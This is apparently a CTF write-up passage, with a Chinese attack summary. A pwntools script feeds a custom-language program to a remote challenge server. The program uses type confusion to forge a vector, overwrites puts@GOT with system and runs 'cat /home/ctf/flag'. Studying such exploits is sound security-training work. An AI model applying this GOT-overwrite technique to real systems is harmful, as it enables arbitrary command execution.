```python
from pwn import *
HOST = "pwn-126d079a6e.adworld.xctf.org.cn"
PORT = 9999
PUTS_GOT = 0x404018
SYSTEM_MINUS_PUTS = 0x52290 - 0x84420

def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)
    # 本地：process(["python3", "/home/ctf/server.py"])
    return process(["python3", "/home/ctf/server.py"])


def send(io, src):
    io.recvuntil(b"END_OF_SOURCE.")
    io.send(src.encode() + b"\nEND_OF_SOURCE\n")


src = f"""function leak(vec b): int a -> int {{
if (a < 0) {{wo
a := 1;
}}
return a;
}}

function asvec(int a): vec b -> vec {{
if (a < 0) {{
b := vec_new(1);
}}
return b;
}}

function main(): int p, int fakep, vec v, vec fake -> int {{
v := vec_new(2);
p := leak(v);

fakep := p + 32;
say("warmup");
scribble(v, 0, {PUTS_GOT});
scribble(v, 1, 1);
fake := asvec(fakep);
scribble(fake, 0, {SYSTEM_MINUS_PUTS});
say("cat /home/ctf/flag");
return 0;
}}"""


if __name__ == "__main__":
    io = start()
    send(io, src)
    print(io.recvall(timeout=3).decode("latin1", errors="ignore"))

```

由此可以编写出一份.slong 文件：总结一下攻击流程：

```plain
  vec_new(2)
    ↓
  得到真实 vec
    ↓
  leak(v) 把 vec_t* 变成 int
    ↓
  p + 32 找到 v->data
    ↓
  把 v->data 伪造成 fake vec_t
    ↓
  fake->data = puts@GOT
  fake->size = 1
    ↓
  scribble(fake, 0, system - puts)
    ↓
  puts@GOT 改成 system
    ↓
  say("cat /home/ctf/flag")
    ↓
  system("cat /home/ctf/flag")
```

